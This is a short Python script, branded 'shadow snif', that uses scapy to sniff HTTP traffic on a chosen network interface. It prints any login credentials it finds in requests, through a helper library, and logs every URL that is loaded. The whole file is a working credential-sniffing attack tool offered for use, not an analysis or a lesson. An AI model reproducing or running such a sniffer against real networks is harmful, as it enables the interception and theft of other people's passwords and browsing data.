#!/usr/bin/env python

import net_lib as nl
import scapy.all as scapy
from scapy.layers import http
import subprocess

subprocess.call(["clear"], shell=True)

subprocess.call(["clear ; figlet shadow snif"], shell=True)
print("\t\t\t\t\t\tA script by SHADOW\n======================================================================\n")
print("[+] Run The Application as ROOT.\n")

try:
    interface = raw_input("Enter Interface : ")

    def sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            login_info = nl.get_login(packet)
            if login_info:
                print("\n\n[+] Possible Login : " + login_info + "\n\n")

            print("[+] Loaded URL : " + nl.get_url(packet))

    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

except KeyboardInterrupt:
    print("\n[-] Ctrl+C detected ! Shutting down sniffer...")